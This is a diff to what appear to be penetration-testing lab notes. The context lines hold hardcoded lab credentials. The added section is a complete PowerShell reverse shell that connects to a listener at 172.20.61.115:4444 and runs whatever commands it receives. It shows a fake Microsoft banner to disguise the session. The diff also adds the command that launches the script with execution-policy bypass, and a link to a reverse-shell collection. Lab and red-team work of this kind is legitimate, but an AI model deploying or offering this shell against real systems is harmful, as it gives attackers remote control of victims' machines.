@@ -7,3 +7,27 @@ $user = 'TESTLAB\dfm.a'
 $pwd = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential($user, $pwd)
 ```
+
+
+## shell
+
+revshell.ps1
+```powershell
+$c = New-Object System.Net.Sockets.TCPClient("172.20.61.115","4444");
+$I = $c.GetStream();[byte[]]$U = 0..(2-shl15)|%{0};
+$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n");
+$I.Write($U,0,$U.Length); $U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>'); $I.Write($U,0,$U.Length);
+while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
+$a = (iex $D 2>&1 | Out-String ); $r  = $a + (pwd).Path + '> '; $m = ([text.encoding]::ASCII).GetBytes($r);
+$I.Write($m,0,$m.Length); $I.Flush()}; $c.Close();
+```
+
+exec file
+```
+powershell -nop -exec Bypass -File revshell.ps1
+```
+
+
+# Links
+
+[PowerShell-Reverse-Shells](https://github.com/0x10F8/PowerShell-Reverse-Shells)
